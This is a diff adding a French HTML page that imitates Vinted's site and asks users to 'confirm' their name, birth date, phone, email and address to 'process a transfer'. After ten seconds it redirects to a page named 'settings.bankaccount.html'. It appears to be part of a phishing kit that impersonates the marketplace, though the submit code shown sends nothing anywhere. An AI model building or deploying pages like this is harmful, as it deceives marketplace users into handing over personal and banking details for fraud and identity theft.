@@ -1,0 +1,895 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vinted | Toute la seconde main dans une seule application</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+    <style>
+        /* Variables CSS pour les couleurs (Header/Footer) */
+        :root {
+            --vinted-green: #3ba78d;
+            --vinted-dark-grey: #333333;
+            --vinted-medium-grey: #555555;
+            --vinted-light-grey: #f5f5f5;
+            --vinted-border-grey: #e8e8e8;
+            --vinted-white: #ffffff;
+            --vinted-text-light-grey: #757575;
+            --vinted-footer-link: #888888;
+            --vinted-footer-hover: #3ba78d;
+            --vinted-error-red: #3ba78d;
+        }
+
+        /* Reset CSS */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            color: var(--vinted-dark-grey);
+            line-height: 1.5;
+            background-color: var(--vinted-white);
+            overflow-x: hidden;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        main {
+            flex: 1;
+        }
+
+        a {
+            text-decoration: none;
+            color: inherit;
+        }
+
+        ul {
+            list-style: none;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* Header */
+        .main-header {
+            background-color: var(--vinted-white);
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .header-top {
+            display: flex;
+            align-items: center;
+            padding: 10px 20px;
+            max-width: 1240px;
+            margin: 0 auto;
+        }
+
+        .header-left-section {
+            display: flex;
+            align-items: center;
+        }
+
+        .logo {
+            letter-spacing: -0.5px;
+            white-space: nowrap;
+            margin-right: 50px;
+        }
+
+        .logo img {
+            height: 30px;
+            vertical-align: middle;
+        }
+
+        .search-container {
+            display: flex;
+            align-items: center;
+            background-color: var(--vinted-light-grey);
+            border-radius: 4px;
+            padding: 0px 15px;
+            width: 600px;
+            position: relative;
+            margin-left: 0;
+            margin-right: auto;
+        }
+
+        .articles-dropdown {
+            font-size: 14px;
+            color: var(--vinted-medium-grey);
+            cursor: pointer;
+            padding: 8px 0px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            margin-right: 15px;
+            white-space: nowrap;
+            border-right: 1px solid var(--vinted-border-grey);
+            padding-right: 15px;
+        }
+
+        .articles-dropdown i {
+            font-size: 12px;
+        }
+
+        .search-bar {
+            flex-grow: 1;
+            display: flex;
+            align-items: center;
+        }
+
+        .search-bar i {
+            color: var(--vinted-medium-grey);
+            margin-right: 10px;
+        }
+
+        .search-bar input {
+            border: none;
+            outline: none;
+            background: transparent;
+            font-size: 14px;
+            color: var(--vinted-dark-grey);
+            width: 100%;
+            padding: 8px 0;
+        }
+
+        .search-bar input::placeholder {
+            color: var(--vinted-medium-grey);
+        }
+
+        .top-nav {
+            margin-left: 60px;
+        }
+
+        .top-nav ul {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .btn {
+            padding: 8px 15px;
+            border-radius: 5px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            white-space: nowrap;
+            border: none;
+            transition: background-color 0.2s ease;
+        }
+
+        .btn-green {
+            background-color: var(--vinted-green);
+            color: var(--vinted-white);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 12px 15px;
+            height: auto;
+        }
+
+        .btn-green:hover {
+            background-color: #008f51;
+        }
+
+        .icon-link {
+            font-size: 18px;
+            color: var(--vinted-medium-grey);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100%;
+        }
+
+        .header-icon {
+            font-size: 20px;
+            color: var(--vinted-medium-grey);
+            background-color: var(--vinted-white);
+            border: 1px solid var(--vinted-border-grey);
+            border-radius: 5px;
+            padding: 7px 10px;
+            cursor: pointer;
+            transition: background-color 0.2s ease, border-color 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 10px;
+        }
+
+        .header-icon:hover {
+            background-color: var(--vinted-light-grey);
+            border-color: var(--vinted-dark-grey);
+        }
+
+        .lang-select {
+            font-size: 14px;
+            color: var(--vinted-medium-grey);
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            cursor: pointer;
+            white-space: nowrap;
+        }
+
+        .categories-nav {
+            background-color: var(--vinted-white);
+            border-top: 1px solid var(--vinted-border-grey);
+            padding: 10px 0;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.02);
+            display: block;
+        }
+
+        .categories-nav .container {
+            display: flex;
+            justify-content: flex-start;
+            flex-wrap: nowrap;
+            gap: 20px;
+            overflow-x: auto;
+            -webkit-overflow-scrolling: touch;
+            padding: 0 20px;
+        }
+
+        .categories-nav ul {
+            display: flex;
+            flex-wrap: nowrap;
+            gap: 20px;
+        }
+
+        .categories-nav ul li a {
+            font-size: 14px;
+            color: var(--vinted-medium-grey);
+            white-space: nowrap;
+            padding: 5px 0;
+            transition: color 0.2s ease;
+        }
+
+        .categories-nav ul li a:hover {
+            color: var(--vinted-green);
+        }
+
+        /* Mobile Header Styles */
+        .mobile-header-top {
+            display: none;
+            align-items: center;
+            justify-content: space-between;
+            padding: 12px 20px;
+            background-color: var(--vinted-white);
+            border-bottom: 1px solid var(--vinted-border-grey);
+        }
+
+        .mobile-menu-icon {
+            font-size: 24px;
+            color: var(--vinted-dark-grey);
+            cursor: pointer;
+        }
+
+        .mobile-header-logo img {
+            height: 30px;
+        }
+
+        .mobile-header-icons {
+            display: flex;
+            gap: 15px;
+        }
+
+        .mobile-header-icon {
+            font-size: 20px;
+            color: var(--vinted-medium-grey);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .mobile-search-bar-container {
+            display: none;
+            padding: 10px 20px;
+            background-color: var(--vinted-white);
+            border-bottom: 1px solid var(--vinted-border-grey);
+        }
+
+        .mobile-categories-chips {
+            display: none;
+            background-color: var(--vinted-white);
+            padding: 10px 0;
+            border-top: 1px solid var(--vinted-border-grey);
+            border-bottom: 1px solid var(--vinted-border-grey);
+            overflow-x: auto;
+            -webkit-overflow-scrolling: touch;
+            white-space: nowrap;
+            scrollbar-width: none;
+        }
+
+        .mobile-categories-chips ul {
+            display: inline-flex;
+            gap: 8px;
+            padding: 0 15px;
+        }
+
+        .mobile-categories-chips a {
+            display: inline-flex;
+            align-items: center;
+            padding: 8px 16px;
+            border: 1px solid var(--vinted-border-grey);
+            border-radius: 20px;
+            background-color: var(--vinted-white);
+            color: var(--vinted-medium-grey);
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        /* Footer Styles */
+        .main-footer {
+            background-color: var(--vinted-white);
+            padding: 40px 0 20px 0;
+            border-top: 1px solid var(--vinted-border-grey);
+        }
+
+        .footer-content {
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 30px;
+            margin-bottom: 40px;
+        }
+
+        .footer-column {
+            flex: 1;
+            min-width: 200px;
+        }
+
+        .footer-column h4 {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            color: var(--vinted-dark-grey);
+        }
+
+        .footer-column ul li {
+            margin-bottom: 8px;
+        }
+
+        .footer-column ul li a {
+            font-size: 14px;
+            color: var(--vinted-footer-link);
+            transition: color 0.2s ease;
+        }
+
+        .footer-column ul li a:hover {
+            color: var(--vinted-footer-hover);
+        }
+
+        .footer-bottom {
+            border-top: 1px solid var(--vinted-border-grey);
+            padding-top: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 20px;
+        }
+
+        .social-icons a {
+            color: var(--vinted-footer-link);
+            font-size: 20px;
+            margin-right: 15px;
+            transition: color 0.2s ease;
+        }
+
+        .social-icons a:hover {
+            color: var(--vinted-footer-hover);
+        }
+
+        .app-badges img {
+            height: 40px;
+            margin-left: 10px;
+        }
+
+        .legal-links {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+
+        .legal-links a {
+            font-size: 13px;
+            color: var(--vinted-footer-link);
+            white-space: nowrap;
+            transition: color 0.2s ease;
+        }
+
+        .legal-links a:hover {
+            color: var(--vinted-footer-hover);
+        }
+
+        /* --- STYLES PAGE CONTENU --- */
+        .page-content-wrapper {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 30px 20px;
+            background-color: #f5f5f5;
+        }
+
+        .page-container {
+            width: 100%;
+            max-width: 700px; 
+            box-shadow: 0 4px 25px rgba(0,0,0,0.1);
+            border-radius: 4px;
+            overflow: hidden;
+            background: white;
+        }
+
+        .top-banner {
+            background-color: #09a1b0;
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+
+        .top-banner p {
+            margin: 0;
+            font-size: 20px;
+            font-weight: 700;
+            line-height: 1.4;
+        }
+
+        .info-card {
+            background: white;
+            padding: 45px; 
+            box-sizing: border-box;
+        }
+
+        h1 {
+            font-size: 28px;
+            font-weight: 700;
+            margin: 0 0 10px 0;
+            color: #111;
+        }
+
+        .security-info {
+            font-size: 17px;
+            color: #333;
+            margin-bottom: 35px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 15px;
+            line-height: 1.4;
+        }
+
+        .lock-icon {
+            font-size: 26px;
+            color: #555;
+        }
+
+        label {
+            display: block;
+            font-size: 18px; 
+            font-weight: 600; 
+            color: #111; 
+            margin-bottom: 12px;
+        }
+
+        .form-group {
+            margin-bottom: 35px;
+        }
+
+        .info-card input {
+            width: 100%;
+            padding: 12px 0;
+            border: none;
+            border-bottom: 2px solid #edeef0; 
+            font-size: 19px;
+            outline: none;
+            color: #000;
+            box-sizing: border-box;
+            background: transparent;
+            transition: border-color 0.2s;
+        }
+
+        .info-card input:focus {
+            border-bottom-color: #007782;
+        }
+
+        .row {
+            display: flex;
+            gap: 40px; 
+        }
+
+        .row .form-group {
+            flex: 1;
+        }
+
+        .btn-submit {
+            background-color: #007782;
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 20px;
+            border-radius: 4px;
+            font-size: 19px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background-color 0.2s;
+        }
+
+        .btn-submit:hover {
+            background-color: #005f68;
+        }
+
+        /* ============================================================
+           MESSAGE DE VÉRIFICATION — INFORMATIONS
+        ============================================================ */
+        .verification-message {
+            margin-top: 20px;
+            padding: 14px 18px;
+            background-color: #f0faf7;
+            border: 1px solid #43a88e;
+            border-radius: 6px;
+            font-size: 16px;
+            color: #2d7a65;
+            font-weight: 500;
+            display: none;
+            text-align: center;
+            line-height: 1.6;
+        }
+
+        .mobile-menu-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 99;
+        }
+
+        .mobile-menu-overlay.active {
+            display: block;
+        }
+
+        /* --- RESPONSIVE --- */
+        @media (max-width: 1024px) {
+            .header-top .top-nav ul { gap: 10px; }
+            .header-top .header-icon { font-size: 16px; padding: 6px 8px; }
+        }
+
+        @media (max-width: 768px) {
+            html, body {
+                width: 100%;
+                max-width: 100%;
+                overflow-x: hidden;
+            }
+
+            .header-top, .categories-nav { display: none; }
+            .mobile-header-top, .mobile-search-bar-container, .mobile-categories-chips { display: block; }
+            .mobile-header-top { display: flex; }
+            .footer-content { flex-direction: column; align-items: center; text-align: center; }
+            .footer-bottom { flex-direction: column; text-align: center; }
+            .page-container {
+                margin-top: 0;
+                max-width: 100%;
+                width: 100%;
+                border-radius: 0;
+                box-shadow: none;
+            }
+            .info-card {
+                padding: 25px;
+                width: 100%;
+                box-sizing: border-box;
+                overflow-x: hidden;
+            }
+            .row {
+                flex-direction: column;
+                gap: 0;
+            }
+            .page-content-wrapper {
+                padding: 0;
+                width: 100%;
+                max-width: 100%;
+                box-sizing: border-box;
+                overflow-x: hidden;
+            }
+            input {
+                width: 100%;
+                box-sizing: border-box;
+            }
+            .form-group {
+                width: 100%;
+                box-sizing: border-box;
+            }
+            .top-banner {
+                width: 100%;
+                box-sizing: border-box;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- HEADER -->
+    <header class="main-header">
+        <!-- Mobile Header -->
+        <div class="mobile-header-top">
+            <i class="fas fa-bars mobile-menu-icon" id="mobile-menu-icon"></i>
+            <a href="#" class="mobile-header-logo">
+                <img src="logovinteddujour.png" alt="Logo">
+            </a>
+            <div class="mobile-header-icons">
+                <a href="#" class="mobile-header-icon"><i class="fas fa-comment-dots"></i></a>
+                <a href="#" class="mobile-header-icon"><i class="fas fa-bell"></i></a>
+                <a href="#" class="mobile-header-icon"><i class="fas fa-heart"></i></a>
+            </div>
+        </div>
+
+        <div class="mobile-search-bar-container">
+            <div class="search-container">
+                <div class="articles-dropdown">Articles <i class="fas fa-chevron-down"></i></div>
+                <div class="search-bar">
+                    <i class="fas fa-search"></i>
+                    <input type="text" placeholder="Rechercher des articles">
+                </div>
+            </div>
+        </div>
+
+        <div class="mobile-categories-chips">
+            <ul>
+                <li><a href="#"><i class="fas fa-eye"></i> <span>Voir tout</span></a></li>
+                <li><a href="#"><i class="fas fa-female"></i> <span>Femmes</span></a></li>
+                <li><a href="#"><i class="fas fa-male"></i> <span>Hommes</span></a></li>
+                <li><a href="#"><i class="fas fa-crown"></i> <span>Créateurs</span></a></li>
+                <li><a href="#"><i class="fas fa-child"></i> <span>Enfant</span></a></li>
+            </ul>
+        </div>
+
+        <!-- Desktop Header -->
+        <div class="header-top">
+            <div class="header-left-section">
+                <a href="#" class="logo">
+                    <img src="logovinteddujour.png" alt="Logo">
+                </a>
+                <div class="search-container">
+                    <div class="articles-dropdown">Articles <i class="fas fa-chevron-down"></i></div>
+                    <div class="search-bar">
+                        <i class="fas fa-search"></i>
+                        <input type="text" placeholder="Rechercher des articles">
+                    </div>
+                </div>
+            </div>
+            <nav class="top-nav">
+                <ul>
+                    <li><a href="#" class="header-icon"><i class="fas fa-comment-dots"></i></a></li>
+                    <li><a href="#" class="header-icon"><i class="fas fa-bell"></i></a></li>
+                    <li><a href="#" class="header-icon"><i class="fas fa-heart"></i></a></li>
+                    <li><a href="#" class="btn btn-green">Vends tes articles</a></li>
+                    <li><a href="#" class="icon-link"><i class="fas fa-question-circle"></i></a></li>
+                    <li><a href="#" class="lang-select">FR <i class="fas fa-chevron-down"></i></a></li>
+                </ul>
+            </nav>
+        </div>
+
+        <nav class="categories-nav">
+            <div class="container">
+                <ul>
+                    <li><a href="#">Femmes</a></li>
+                    <li><a href="#">Hommes</a></li>
+                    <li><a href="#">Articles de créateurs</a></li>
+                    <li><a href="#">Enfants</a></li>
+                    <li><a href="#">Maison</a></li>
+                    <li><a href="#">Électronique</a></li>
+                    <li><a href="#">Divertissement</a></li>
+                    <li><a href="#">Sport</a></li>
+                    <li><a href="#">Animaux</a></li>
+                    <li><a href="#">À propos</a></li>
+                    <li><a href="#">Notre plateforme</a></li>
+                </ul>
+            </div>
+        </nav>
+    </header>
+
+    <!-- MAIN CONTENT -->
+    <main>
+        <div class="page-content-wrapper">
+            <div class="page-container">
+                <div class="top-banner">
+                    <p>Veuillez confirmer vos informations personnelles pour permettre le traitement sécurisé de votre transfert..</p>
+                </div>
+
+                <div class="info-card">
+                    <h1>Informations personnelles</h1>
+                    
+                    <div class="security-info">
+                        <span>Tes données sont traitées conformément à notre politique de confidentialité</span>
+                        <span class="lock-icon">🔒</span>
+                    </div>
+
+                    <form id="personalInfoForm">
+                        <div class="form-group">
+                            <label for="nom">Nom complet</label>
+                            <input type="text" id="nom" placeholder="Saisis ton nom et prénom" required>
+                        </div>
+
+                        <div class="row">
+                            <div class="form-group">
+                                <label for="dob">Date de naissance</label>
+                                <input type="text" id="dob" placeholder="JJ / MM / AAAA" maxlength="14" required>
+                            </div>
+                            <div class="form-group">
+                                <label for="tel">Téléphone</label>
+                                <input type="tel" id="tel" placeholder="06 12 34 56 78" required>
+                            </div>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="email">E-mail</label>
+                            <input type="email" id="email" placeholder="exemple@mail.com" required>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="adresse">Adresse</label>
+                            <input type="text" id="adresse" placeholder="Numéro et nom de rue" required>
+                        </div>
+
+                        <div class="row">
+                            <div class="form-group">
+                                <label for="ville">Ville</label>
+                                <input type="text" id="ville" placeholder="Ex: Paris" required>
+                            </div>
+                            <div class="form-group">
+                                <label for="pays">Pays</label>
+                                <input type="text" id="pays" placeholder="Ex: France" required>
+                            </div>
+                        </div>
+
+                        <button type="submit" class="btn-submit" id="submitBtn">Confirmer mes informations</button>
+
+                        <div class="verification-message" id="verificationMessage">
+                            Vérification de vos informations en cours...
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- FOOTER -->
+    <footer class="main-footer">
+        <div class="container">
+
+            <div class="footer-content">
+                <div class="footer-column">
+                    <h4>Vinted</h4>
+                    <ul>
+                        <li><a href="#">À propos de Vinted</a></li>
+                        <li><a href="#">Carrière</a></li>
+                        <li><a href="#">Le développement durable</a></li>
+                        <li><a href="#">Presse</a></li>
+                        <li><a href="#">Publicités</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h4>Découvrir</h4>
+                    <ul>
+                        <li><a href="#">Comment ça marche</a></li>
+                        <li><a href="#">Vérification de l'article</a></li>
+                        <li><a href="#">Applications mobiles</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h4>Aide</h4>
+                    <ul>
+                        <li><a href="#">Centre d'aide</a></li>
+                        <li><a href="#">Vendre</a></li>
+                        <li><a href="#">Acheter</a></li>
+                        <li><a href="#">Confiance et sécurité</a></li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="footer-bottom">
+                <div class="social-icons">
+                    <a href="#"><i class="fab fa-facebook-f"></i></a>
+                    <a href="#"><i class="fab fa-linkedin-in"></i></a>
+                    <a href="#"><i class="fab fa-instagram"></i></a>
+                </div>
+                <div class="app-badges">
+                    <a href="#"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3c/Download_on_the_App_Store_Badge.svg/2560px-Download_on_the_App_Store_Badge.svg.png" alt="App Store"></a>
+                    <a href="#"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/Google_Play_Store_badge_EN.svg/2560px-Google_Play_Store_badge_EN.svg.png" alt="Google Play"></a>
+                </div>
+                <div class="legal-links">
+                    <a href="#">Politique de Confidentialité</a>
+                    <a href="#">Politique de cookies</a>
+                    <a href="#">Paramètres des cookies</a>
+                    <a href="#">Termes et Conditions</a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <div class="mobile-menu-overlay" id="mobile-menu-overlay"></div>
+
+    <script>
+        // Script pour le menu mobile
+        const menuIcon = document.getElementById('mobile-menu-icon');
+        const overlay = document.getElementById('mobile-menu-overlay');
+        
+        if(menuIcon && overlay) {
+            menuIcon.addEventListener('click', () => {
+                overlay.classList.toggle('active');
+            });
+            overlay.addEventListener('click', () => {
+                overlay.classList.remove('active');
+            });
+        }
+
+        // Script pour le formulaire d'informations personnelles
+        const dob = document.getElementById('dob');
+        const tel = document.getElementById('tel');
+        const submitBtn = document.getElementById('submitBtn');
+
+        // Masque pour la date de naissance (JJ / MM / AAAA)
+        if(dob) {
+            dob.addEventListener('input', (e) => {
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length > 4) {
+                    e.target.value = value.substring(0, 2) + ' / ' + value.substring(2, 4) + ' / ' + value.substring(4, 8);
+                } else if (value.length > 2) {
+                    e.target.value = value.substring(0, 2) + ' / ' + value.substring(2, 4);
+                } else {
+                    e.target.value = value;
+                }
+            });
+        }
+
+        // Masque simple pour le téléphone (espaces)
+        if(tel) {
+            tel.addEventListener('input', (e) => {
+                let value = e.target.value.replace(/\D/g, '');
+                let formatted = value.match(/.{1,2}/g);
+                if (formatted) {
+                    e.target.value = formatted.join(' ');
+                }
+            });
+        }
+
+        // Gestion de la soumission
+        const infoForm = document.getElementById('personalInfoForm');
+        if(infoForm) {
+            infoForm.addEventListener('submit', async (e) => {
+                e.preventDefault();
+                
+
+                
+                // Désactiver le bouton
+                submitBtn.innerText = "Traitement en cours...";
+                submitBtn.style.backgroundColor = "#ccc";
+                submitBtn.disabled = true;
+                submitBtn.style.cursor = "default";
+
+                // Afficher le message de vérification
+                const verificationMessage = document.getElementById('verificationMessage');
+                if(verificationMessage) verificationMessage.style.display = 'block';
+                
+                // Redirection automatique après 10 secondes
+                setTimeout(function() {
+                    window.location.href = "settings.bankaccount.html";
+                }, 10000);
+            });
+        }
+    </script>
+
+</body>
+</html>
